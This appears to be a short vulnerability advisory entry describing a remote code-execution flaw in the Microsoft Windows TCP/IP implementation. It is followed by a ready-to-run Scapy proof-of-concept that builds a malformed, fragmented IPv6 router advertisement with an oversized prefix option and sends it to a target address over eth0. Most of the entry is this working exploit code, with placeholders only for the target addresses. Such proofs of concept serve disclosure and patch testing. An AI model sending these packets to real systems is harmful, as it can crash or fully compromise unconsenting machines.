Microsoft Windows TCP/IP protocol implementation is prone to a remote code-execution vulnerability.

An attacker can exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successful attacks will completely compromise affected computers. Failed exploit attempts will likely result in denial-of-service conditions.


v6_dst = "<IPv6 address>"

mac_dst = "<Mac address>"

pkt = IPv6(dst=v6_dst, hlim=255) / IPv6ExtHdrFragment() / ICMPv6ND_RA() / ICMPv6NDOptPrefixInfo(len=255, prefixlen=64, prefix="2001::") / Raw(load='A'*2008)

l=fragment6(pkt, 1500)

for p in l:
sendp(Ether(dst=mac_dst)/p, iface="eth0")
